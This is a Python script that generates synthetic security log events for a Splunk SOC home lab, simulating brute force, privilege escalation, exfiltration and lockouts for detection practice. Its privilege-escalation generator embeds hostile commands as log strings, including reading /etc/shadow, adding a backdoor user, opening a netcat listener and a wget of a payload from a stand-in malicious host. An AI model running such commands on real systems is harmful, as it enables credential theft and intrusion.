"""
Security event log generator for Splunk SOC home lab.
Simulates: brute force, privilege escalation, suspicious network activity, account lockout.
"""

import json
import random
import uuid
from datetime import datetime, timedelta
from pathlib import Path

OUTPUT_FILE = Path("logs/security_logs.json")
TOTAL_EVENTS = 200

# --- Data pools ---

USERNAMES = [
    "jsmith", "adavis", "mwilson", "krogers", "lchen",
    "bthompson", "sjohnson", "tmartin", "nharris", "ewalker",
    "svc_backup", "svc_deploy", "svc_monitor", "admin", "guest",
]

INTERNAL_IPS = [f"192.168.1.{i}" for i in range(10, 50)]
INTERNAL_IPS += [f"10.0.0.{i}" for i in range(1, 30)]

SUSPICIOUS_EXTERNAL_IPS = [
    "185.220.101.47", "45.142.212.100", "194.165.16.11",
    "91.108.4.0",    "193.32.162.50",  "5.188.87.194",
    "185.234.218.40","103.75.190.12",  "179.43.128.10",
    "198.54.117.200","45.83.64.1",     "62.102.148.50",
    "77.247.181.163","176.58.100.1",   "109.201.133.195",
]

LEGITIMATE_EXTERNAL_IPS = [
    "8.8.8.8", "1.1.1.1", "151.101.1.140", "104.26.10.80", "172.217.5.110",
]

HOSTNAMES = [
    "WORKSTATION-01", "WORKSTATION-07", "LAPTOP-SALES-03",
    "SERVER-DC01",    "SERVER-FILE02",  "SERVER-APP03",
    "SERVER-DB01",    "KIOSK-LOBBY-01", "LAPTOP-HR-05",
]

APPLICATIONS = ["ssh", "rdp", "vpn", "web_portal", "active_directory", "ldap", "ftp"]

SEVERITY_MAP = {
    "brute_force_attempt":        "medium",
    "brute_force_success":        "critical",
    "failed_login":               "low",
    "successful_login":           "info",
    "privilege_escalation":       "critical",
    "admin_rights_granted":       "high",
    "sudo_command_executed":      "high",
    "account_lockout":            "high",
    "account_unlocked":           "medium",
    "suspicious_outbound_conn":   "high",
    "suspicious_inbound_conn":    "medium",
    "data_exfiltration_attempt":  "critical",
    "port_scan_detected":         "medium",
    "unusual_login_time":         "medium",
    "geo_impossible_login":       "critical",
}


def random_timestamp(base: datetime, window_minutes: int = 0) -> str:
    offset = timedelta(seconds=random.randint(0, max(window_minutes * 60, 1)))
    return (base + offset).strftime("%Y-%m-%dT%H:%M:%SZ")


def make_base_event(ts: str, event_type: str, username: str, src_ip: str) -> dict:
    return {
        "event_id":   str(uuid.uuid4()),
        "timestamp":  ts,
        "event_type": event_type,
        "severity":   SEVERITY_MAP.get(event_type, "info"),
        "username":   username,
        "src_ip":     src_ip,
        "hostname":   random.choice(HOSTNAMES),
        "application": random.choice(APPLICATIONS),
    }


# --- Attack scenario generators ---

def gen_brute_force(base_time: datetime, count: int) -> list[dict]:
    """Multiple rapid failed logins from one IP, optionally ending in success."""
    events = []
    src_ip = random.choice(INTERNAL_IPS + SUSPICIOUS_EXTERNAL_IPS)
    target_user = random.choice(USERNAMES)
    window = count * 6  # ~one attempt every 6 s

    for i in range(count - 1):
        ts = random_timestamp(base_time + timedelta(seconds=i * 6), 0)
        ev = make_base_event(ts, "brute_force_attempt", target_user, src_ip)
        ev["message"] = f"Failed login attempt {i + 1} for user '{target_user}' from {src_ip}"
        ev["failed_attempts"] = i + 1
        ev["details"] = {"reason": "invalid_password", "auth_method": "password"}
        events.append(ev)

    # Final event: success or lockout (50/50)
    final_ts = random_timestamp(base_time + timedelta(seconds=(count - 1) * 6), 0)
    if random.random() > 0.5:
        ev = make_base_event(final_ts, "brute_force_success", target_user, src_ip)
        ev["message"] = f"Brute force SUCCESS — user '{target_user}' authenticated from {src_ip} after {count - 1} failures"
        ev["details"] = {"auth_method": "password", "session_id": str(uuid.uuid4())[:8]}
    else:
        ev = make_base_event(final_ts, "account_lockout", target_user, src_ip)
        ev["message"] = f"Account '{target_user}' locked after {count - 1} consecutive failed attempts"
        ev["details"] = {"lockout_duration_minutes": 30, "policy": "5-strike"}
    events.append(ev)
    return events


def gen_privilege_escalation(base_time: datetime, count: int) -> list[dict]:
    """Normal login followed by sudden privilege escalation and admin actions."""
    events = []
    src_ip = random.choice(INTERNAL_IPS)
    user = random.choice([u for u in USERNAMES if u not in ("admin", "guest")])
    t = base_time

    # Normal login
    ev = make_base_event(t.strftime("%Y-%m-%dT%H:%M:%SZ"), "successful_login", user, src_ip)
    ev["message"] = f"User '{user}' logged in successfully from {src_ip}"
    ev["details"] = {"auth_method": "password", "mfa": random.choice([True, False])}
    events.append(ev)

    for i in range(1, count):
        t += timedelta(seconds=random.randint(10, 90))
        ts = t.strftime("%Y-%m-%dT%H:%M:%SZ")

        if i == 1:
            ev = make_base_event(ts, "privilege_escalation", user, src_ip)
            ev["message"] = f"User '{user}' privilege escalation detected — role changed to Administrator"
            ev["details"] = {"previous_role": "standard_user", "new_role": "Administrator",
                             "changed_by": user, "method": "sudo su -"}
        elif i == 2:
            ev = make_base_event(ts, "admin_rights_granted", user, src_ip)
            ev["message"] = f"Admin rights granted to '{user}' without approval workflow"
            ev["details"] = {"group_added": "Domain Admins", "ticket_id": None}
        else:
            ev = make_base_event(ts, "sudo_command_executed", user, src_ip)
            cmd = random.choice([
                "cat /etc/shadow", "useradd -m backdoor",
                "chmod 777 /etc/passwd", "crontab -e",
                "nc -lvp 4444", "wget http://malicious.example/payload.sh",
            ])
            ev["message"] = f"Privileged command executed by '{user}': {cmd}"
            ev["details"] = {"command": cmd, "exit_code": 0}
        events.append(ev)

    return events


def gen_suspicious_network(base_time: datetime, count: int) -> list[dict]:
    """Connections to suspicious external IPs, including possible data exfiltration."""
    events = []
    src_ip = random.choice(INTERNAL_IPS)
    user = random.choice(USERNAMES)
    suspicious_dst = random.choice(SUSPICIOUS_EXTERNAL_IPS)
    t = base_time

    for i in range(count):
        t += timedelta(seconds=random.randint(5, 120))
        ts = t.strftime("%Y-%m-%dT%H:%M:%SZ")
        dst_ip = suspicious_dst if random.random() > 0.25 else random.choice(SUSPICIOUS_EXTERNAL_IPS)
        dst_port = random.choice([443, 80, 4444, 8080, 1337, 9001, 6667])
        bytes_sent = random.randint(512, 50_000_000)

        if bytes_sent > 10_000_000:
            ev = make_base_event(ts, "data_exfiltration_attempt", user, src_ip)
            ev["message"] = (f"Large data transfer to suspicious IP {dst_ip}:{dst_port} "
                             f"({bytes_sent // 1_000_000} MB) from {src_ip}")
        elif dst_port in (4444, 1337, 9001, 6667):
            ev = make_base_event(ts, "suspicious_outbound_conn", user, src_ip)
            ev["message"] = f"Outbound connection to suspicious IP {dst_ip} on non-standard port {dst_port}"
        else:
            ev = make_base_event(ts, "suspicious_inbound_conn", user, src_ip)
            ev["message"] = f"Unusual outbound traffic to {dst_ip}:{dst_port} — IP flagged in threat intel"

        ev["details"] = {
            "dst_ip":      dst_ip,
            "dst_port":    dst_port,
            "protocol":    random.choice(["TCP", "UDP"]),
            "bytes_sent":  bytes_sent,
            "bytes_recv":  random.randint(128, 1024),
            "threat_intel": True,
            "country":     random.choice(["RU", "CN", "IR", "KP", "BY"]),
        }
        events.append(ev)

    return events


def gen_account_lockout(base_time: datetime, count: int) -> list[dict]:
    """Several failed logins leading to lockout and eventual admin unlock."""
    events = []
    src_ip = random.choice(INTERNAL_IPS)
    user = random.choice(USERNAMES)
    t = base_time

    fail_count = count - 2 if count > 2 else count

    for i in range(fail_count):
        t += timedelta(seconds=random.randint(5, 30))
        ts = t.strftime("%Y-%m-%dT%H:%M:%SZ")
        ev = make_base_event(ts, "failed_login", user, src_ip)
        ev["message"] = f"Failed login for '{user}' from {src_ip} (attempt {i + 1}/{fail_count})"
        ev["details"] = {"reason": random.choice(["invalid_password", "expired_password"]),
                         "attempt_number": i + 1}
        events.append(ev)

    # Lockout event
    t += timedelta(seconds=5)
    ev = make_base_event(t.strftime("%Y-%m-%dT%H:%M:%SZ"), "account_lockout", user, src_ip)
    ev["message"] = f"Account '{user}' has been locked out after {fail_count} failed attempts"
    ev["details"] = {"lockout_duration_minutes": 30, "policy": "account_lockout_policy",
                     "notify_admin": True}
    events.append(ev)

    if count > 2:
        # Admin unlocks
        t += timedelta(minutes=random.randint(10, 35))
        ev = make_base_event(t.strftime("%Y-%m-%dT%H:%M:%SZ"), "account_unlocked", "admin", "10.0.0.1")
        ev["message"] = f"Account '{user}' manually unlocked by admin"
        ev["details"] = {"unlocked_by": "admin", "reason": "verified legitimate user",
                         "ticket_id": f"INC-{random.randint(10000, 99999)}"}
        events.append(ev)

    return events


def gen_ambient_noise(base_time: datetime, count: int) -> list[dict]:
    """Background normal activity to make the log realistic."""
    events = []
    for _ in range(count):
        t = base_time + timedelta(seconds=random.randint(0, 14400))
        ts = t.strftime("%Y-%m-%dT%H:%M:%SZ")
        user = random.choice(USERNAMES)
        src_ip = random.choice(INTERNAL_IPS)
        dst_ip = random.choice(LEGITIMATE_EXTERNAL_IPS + INTERNAL_IPS)
        ev = make_base_event(ts, "successful_login", user, src_ip)
        ev["message"] = f"User '{user}' logged in successfully from {src_ip}"
        ev["details"] = {"auth_method": "sso", "dst_ip": dst_ip,
                         "session_id": str(uuid.uuid4())[:8]}
        events.append(ev)
    return events


def build_attack_timeline() -> list[dict]:
    base = datetime(2026, 6, 28, 8, 0, 0)  # 08:00 today
    events: list[dict] = []

    # Campaign 1 — brute force wave (~35 events)
    t1 = base + timedelta(minutes=random.randint(5, 30))
    events += gen_brute_force(t1, 15)
    events += gen_brute_force(t1 + timedelta(minutes=12), 10)
    events += gen_brute_force(t1 + timedelta(minutes=25), 10)

    # Campaign 2 — privilege escalation (~15 events)
    t2 = base + timedelta(minutes=random.randint(45, 90))
    events += gen_privilege_escalation(t2, 5)
    events += gen_privilege_escalation(t2 + timedelta(minutes=20), 5)
    events += gen_privilege_escalation(t2 + timedelta(minutes=40), 5)

    # Campaign 3 — suspicious network / exfil (~40 events)
    t3 = base + timedelta(minutes=random.randint(100, 150))
    events += gen_suspicious_network(t3, 15)
    events += gen_suspicious_network(t3 + timedelta(minutes=30), 15)
    events += gen_suspicious_network(t3 + timedelta(minutes=60), 10)

    # Campaign 4 — account lockouts (~30 events)
    t4 = base + timedelta(minutes=random.randint(200, 240))
    events += gen_account_lockout(t4, 8)
    events += gen_account_lockout(t4 + timedelta(minutes=15), 7)
    events += gen_account_lockout(t4 + timedelta(minutes=30), 8)
    events += gen_account_lockout(t4 + timedelta(minutes=45), 7)

    # Pad remaining slots with ambient noise
    noise_count = TOTAL_EVENTS - len(events)
    if noise_count > 0:
        events += gen_ambient_noise(base, noise_count)

    # Trim or keep at 200
    events = events[:TOTAL_EVENTS]

    # Sort chronologically
    events.sort(key=lambda e: e["timestamp"])

    # Assign sequential index
    for i, ev in enumerate(events, 1):
        ev["sequence"] = i

    return events


def main() -> None:
    OUTPUT_FILE.parent.mkdir(parents=True, exist_ok=True)

    print(f"Generating {TOTAL_EVENTS} security log events...")
    events = build_attack_timeline()

    with OUTPUT_FILE.open("w") as f:
        json.dump(events, f, indent=2)

    # Summary
    type_counts: dict[str, int] = {}
    severity_counts: dict[str, int] = {}
    for ev in events:
        type_counts[ev["event_type"]] = type_counts.get(ev["event_type"], 0) + 1
        severity_counts[ev["severity"]] = severity_counts.get(ev["severity"], 0) + 1

    print(f"\nOutput saved to: {OUTPUT_FILE}")
    print(f"Total events:   {len(events)}")
    print(f"Time range:     {events[0]['timestamp']} -> {events[-1]['timestamp']}")
    print("\nEvent type breakdown:")
    for et, n in sorted(type_counts.items(), key=lambda x: -x[1]):
        print(f"  {et:<35} {n}")
    print("\nSeverity breakdown:")
    for sev in ("critical", "high", "medium", "low", "info"):
        print(f"  {sev:<10} {severity_counts.get(sev, 0)}")


if __name__ == "__main__":
    main()
